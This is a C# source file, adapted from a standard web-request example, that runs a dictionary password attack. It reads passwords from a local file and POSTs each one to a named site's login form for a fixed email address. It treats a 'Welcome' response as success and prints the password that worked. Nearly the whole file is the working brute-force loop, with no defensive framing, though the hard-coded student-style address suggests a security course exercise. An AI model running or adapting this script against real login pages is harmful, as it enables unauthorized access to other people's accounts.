using System;
using System.IO;
using System.Net;
using System.Text;

namespace Examples.System.Net
{
    public class WebRequestPostExample
    {
        public static void Main()
        {
            int i = 0;
            foreach (string line in File.ReadAllLines("passwords.txt"))
            {
                string[] parts = line.Split(',');
                foreach (string part in parts)
                {
                    var password = part.Replace("\'", "").Trim();
                    //Console.WriteLine(password);
                    // Create a request using a URL that can receive a post. 
                    WebRequest request = WebRequest.Create("http://ssdprogram.ca/welcome.php");
                    // Set the Method property of the request to POST.
                    request.Method = "POST";
                    // Request body.
                    //string postData = "txtName=Bob&txtPwd=P@ssw0rd";
                    string postData = "txtName=jbenoit7@my.bcit.ca&txtPwd=" + password;
                    byte[] byteArray = Encoding.UTF8.GetBytes(postData);
                    // Set the ContentType property of the WebRequest.
                    request.ContentType = "application/x-www-form-urlencoded";
                    // Set the ContentLength property of the WebRequest.
                    request.ContentLength = byteArray.Length;
                    // Get the request stream.
                    Stream dataStream = request.GetRequestStream();
                    // Write the data to the request stream.
                    dataStream.Write(byteArray, 0, byteArray.Length);
                    // Close the Stream object.
                    dataStream.Close();
                    // Get the response.
                    WebResponse response = request.GetResponse();
                    // Display the status.
                    Console.WriteLine(((HttpWebResponse)response).StatusDescription);
                    // Get the stream containing content returned by the server.
                    dataStream = response.GetResponseStream();
                    // Open the stream using a StreamReader for easy access.
                    StreamReader reader = new StreamReader(dataStream);
                    // Read the content.
                    string responseFromServer = reader.ReadToEnd();

                    if (responseFromServer.Contains("Welcome"))
                    {
                        //Console.WriteLine(responseFromServer);
                      //  Console.WriteLine(parts);
                        Console.WriteLine("password is>" + password + "<");
                    }
                    else
                    {
                        Console.WriteLine("pass not>" + password + "<");
                    }
                    i++;

                    // Display the content.

                    // Clean up the streams.
                        reader.Close();
                        dataStream.Close();
                        response.Close();
           
                   }
            }

       // Console.ReadLine();
        }
    }
}

